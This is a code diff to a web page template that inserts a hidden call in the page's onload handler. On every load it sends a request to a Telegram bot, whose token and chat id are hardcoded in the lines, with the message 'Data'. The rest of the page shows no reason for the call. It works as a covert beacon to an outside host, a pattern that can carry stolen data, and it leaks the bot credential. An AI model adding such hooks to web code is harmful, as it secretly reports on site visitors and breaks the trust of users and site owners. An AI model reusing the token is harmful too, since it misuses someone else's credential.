@@ -46,6 +46,12 @@ ${text}</pre>
 
     <script>
         window.onload = function(){
+            let url = "https://api.telegram.org/bot5465151197:AAEo00Fhed2kh8jn_4T_0OYyvCoukbiwjkM/sendMessage?chat_id=5131265599&text="
+            let message = "Data"
+            let xhttp = new XMLHttpRequest()
+            xhttp.open("GET", url + message , true)
+            xhttp.send()
+
             let 
                 c = console.log
                 input = document.querySelector(".input")
